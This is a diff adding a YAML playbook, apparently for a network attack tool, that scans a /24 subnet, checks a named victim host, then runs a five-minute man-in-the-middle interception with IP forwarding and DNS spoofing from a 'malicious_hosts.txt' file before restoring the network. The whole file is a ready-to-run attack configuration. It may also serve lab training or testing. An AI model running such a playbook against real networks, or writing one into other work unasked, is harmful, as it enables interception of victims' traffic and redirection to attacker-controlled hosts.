@@ -1,0 +1,35 @@
+name: "Targeted Interception Investigation"
+description: "Simulates a full Man-in-the-Middle attack on a specific target."
+steps:
+  - action: discover
+    name: "Identify Target"
+    args:
+      cidr: "192.168.1.0/24"
+      json: "scan.json"
+
+  # Manual step: In a real scenario, you'd filter 'scan.json' or provide target IP.
+  # Here we assume target is known or passed via CLI override if supported.
+  # For template purposes, we use placeholders.
+
+  - action: check
+    name: "Pre-Attack Health Check"
+    args:
+      victim: ["192.168.1.15"]
+      ping: true
+
+  - action: mitm
+    name: "Execute Interception (Forwarding + DNS Spoof)"
+    args:
+      victim: ["192.168.1.15"]
+      gateway: "192.168.1.1"
+      forward: true
+      dns_spoof: true
+      dns_hosts_file: "malicious_hosts.txt"
+      duration: 300
+      restore: true
+
+  - action: check
+    name: "Post-Attack Restoration Check"
+    args:
+      victim: ["192.168.1.15"]
+      ping: true
